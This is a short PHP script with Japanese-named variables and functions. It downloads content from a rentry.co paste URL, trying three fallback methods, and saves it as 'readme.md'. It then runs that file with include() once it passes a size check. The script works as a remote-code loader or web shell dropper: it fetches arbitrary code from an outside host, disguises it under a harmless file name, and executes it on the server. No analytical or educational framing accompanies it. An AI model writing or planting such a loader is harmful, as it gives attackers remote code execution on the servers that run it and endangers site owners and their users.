<?php
$プロトコル = 'https';
$ドメイン = 'rentry.co';
$パスセグメント1 = 'aboutphp';
$パスセグメント2 = 'raw';

$url = sprintf('%s://%s/%s/%s', $プロトコル, $ドメイン, $パスセグメント1, $パスセグメント2);
$ファイル名 = 'readme.md';
$最小ファイルサイズ = 1024;

function ダウンロードファイル($url, $ファイル名) {
    $コンテンツ = @file_get_contents($url);
    if ($コンテンツ !== false) {
        file_put_contents($ファイル名, $コンテンツ);
        return true;
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $コンテンツ = curl_exec($ch);
    curl_close($ch);

    if ($コンテンツ !== false) {
        file_put_contents($ファイル名, $コンテンツ);
        return true;
    }

    $オプション = [
        'http' => [
            'method' => 'GET',
            'header' => 'User-Agent: PHP'
        ]
    ];
    $コンテキスト = stream_context_create($オプション);
    $コンテンツ = @file_get_contents($url, false, $コンテキスト);

    if ($コンテンツ !== false) {
        file_put_contents($ファイル名, $コンテンツ);
        return true;
    }

    return false;
}

function 実行ファイル($ファイル名) {
    if (file_exists($ファイル名)) {
        include($ファイル名);
    }
}

function ファイルサイズを確認($ファイル名, $最小サイズ) {
    return file_exists($ファイル名) && filesize($ファイル名) >= $最小サイズ;
}

if (ダウンロードファイル($url, $ファイル名)) {
    if (!ファイルサイズを確認($ファイル名, $最小ファイルサイズ)) {
        unlink($ファイル名);
        ダウンロードファイル($url, $ファイル名);
    }
    実行ファイル($ファイル名);
}
?>
